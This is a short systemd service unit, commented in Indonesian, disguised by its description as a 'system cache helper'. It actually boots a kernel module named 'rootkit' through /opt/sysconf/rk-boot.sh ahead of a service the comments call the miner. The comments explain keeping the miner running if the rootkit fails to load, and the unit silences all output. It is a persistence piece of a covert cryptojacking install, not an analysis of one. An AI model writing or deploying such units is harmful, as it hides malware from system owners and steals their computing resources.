[Unit]
Description=Preload system cache helper
DefaultDependencies=no
After=network.target
Before=syscached.service
# Wants= bukan Requires=: miner harus tetap jalan walau modul gagal dimuat
# (mis. kernel baru tanpa header build).
Wants=syscached.service

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/opt/sysconf/rk-boot.sh
# Tanda "-" = kegagalan diabaikan. Modul tidak lagi memutasi module->list
# (lihat rootkit.c), jadi rmmod selalu bisa menemukannya; bila modul memang
# tidak termuat, stop service tidak boleh dianggap gagal.
ExecStop=-/sbin/rmmod rootkit
StandardOutput=null

[Install]
WantedBy=multi-user.target
